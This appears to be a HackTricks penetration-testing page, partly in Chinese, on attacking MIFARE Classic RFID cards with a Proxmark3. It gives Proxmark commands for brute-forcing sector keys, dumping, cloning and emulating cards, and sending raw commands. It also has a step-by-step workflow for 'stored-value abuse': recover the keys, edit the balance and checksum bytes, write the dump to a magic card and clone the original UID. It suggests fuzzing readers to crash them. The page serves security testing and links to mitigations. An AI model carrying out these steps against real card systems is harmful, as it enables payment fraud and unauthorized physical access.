# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## 使用 Proxmark3 攻击 RFID 系统

The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### 针对 MIFARE Classic 1KB 的攻击

它有 **16 sectors**，每个有 **4 blocks**，每个 block 包含 **16B**。UID 位于 sector 0 block 0（且不能被更改）。\
要访问每个 sector 你需要 **2 keys**（**A** 和 **B**），它们存储在 **block 3 of each sector**（sector trailer）。sector trailer 还存储 **access bits**，这些位决定了使用这两个 keys 对 **each block** 的 **read and write** 权限。\
2 keys 可用于例如：如果你知道第一个则可以赋予读取权限，如果你知道第二个则可以赋予写入权限（例如）。

Several attacks can be performed
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **cryptographic operations used are weak** and knowing the plain and cipher text you can calculate it (`mfkey64` tool).

#### MiFare Classic quick workflow for stored-value abuse

当终端在 Classic 卡上存储余额时，典型的端到端流程是：
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
注意

- `hf mf autopwn` 协调 nested/darkside/HardNested-style 攻击，恢复密钥，并在 client dumps 文件夹中创建 dumps。
- 写入 block 0/UID 仅适用于 magic gen1a/gen2 cards。普通 Classic cards 的 UID 为只读。
- 许多部署使用 Classic "value blocks" 或简单的 checksums。编辑后请确保所有 duplicated/complemented fields 和 checksums 保持一致。

参见更高层次的方法论和缓解措施：

{{#ref}}
pentesting-rfid.md
{{#endref}}

### 原始命令

IoT 系统有时使用 **nonbranded or noncommercial tags**。在这种情况下，你可以使用 Proxmark3 向它们发送自定义 **raw commands to the tags**。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
有了这些信息，你可以尝试搜索有关该卡以及与其通信方式的信息。Proxmark3 允许发送原始命令，例如：`hf 14a raw -p -b 7 26`

### 脚本

Proxmark3 软件附带了预加载的 **自动化脚本** 列表，可用于执行简单任务。要检索完整列表，请使用 `script list` 命令。接着使用 `script run` 命令，后面跟上脚本名称：
```
proxmark3> script run mfkeys
```
你可以创建一个脚本来 **fuzz tag readers**，在复制一个 **valid card** 的数据时，只需编写一个 **Lua script** 对一个或多个随机 **bytes** 进行 **randomize**，并检查在任意一次迭代中是否会 **reader crashes**。

## 参考资料

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
